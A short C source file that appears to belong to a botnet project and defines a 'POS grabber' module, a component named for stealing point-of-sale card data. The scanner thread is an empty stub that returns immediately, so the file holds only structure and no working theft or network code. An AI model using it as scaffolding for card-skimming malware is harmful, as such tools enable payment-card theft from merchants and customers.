#include "pos_grabber.h"

#ifdef MODULE_POS_GRABBER

#include "..\common\thread.h"

extern bot_t bot;

DWORD WINAPI dwScannerThread(LPVOID lpArguments)
{
	return 0;
}

void StartPOSGrabber(void)
{
	Thread_CreateThread((LPTHREAD_START_ROUTINE)dwScannerThread, NULL);
}
#endif